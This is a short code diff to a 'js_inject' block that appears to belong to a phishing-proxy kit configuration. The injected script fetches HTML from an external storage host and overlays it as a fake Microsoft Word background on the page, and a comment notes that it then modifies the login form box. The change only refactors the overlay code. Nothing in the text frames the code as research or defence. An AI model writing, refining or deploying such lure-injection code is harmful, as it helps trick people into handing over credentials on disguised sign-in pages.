@@ -133,23 +133,14 @@ js_inject:
         fetch("https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html")
           .then(res => res.text())
           .then(html => {
-            const wordBG = document.createElement("div");
-            wordBG.id = "wordInterfaceBackground";
-            wordBG.style.position = "absolute";
-            wordBG.style.top = "0";
-            wordBG.style.left = "0";
-            wordBG.style.width = "100%";
-            wordBG.style.zIndex = "0";
-            wordBG.innerHTML = html;
-
+            const wrapper = document.createElement("div");
+            wrapper.id = "customWordBackground";
+            wrapper.style.zIndex = "0";
+            wrapper.style.pointerEvents = "none";
+            wrapper.innerHTML = html;
             const winScroll = document.querySelector(".win-scroll");
-            if (winScroll && winScroll.parentElement) {
-              winScroll.parentElement.insertBefore(wordBG, winScroll.nextSibling);
-            } else {
-              document.body.appendChild(wordBG);
-            }
-          })
-          .catch(err => console.error("Failed to load Word background:", err));
+            if (winScroll) winScroll.insertAdjacentElement("afterend", wrapper);
+          });
 
         // Modify form box content
         const waitForFormReady = setInterval(() => {
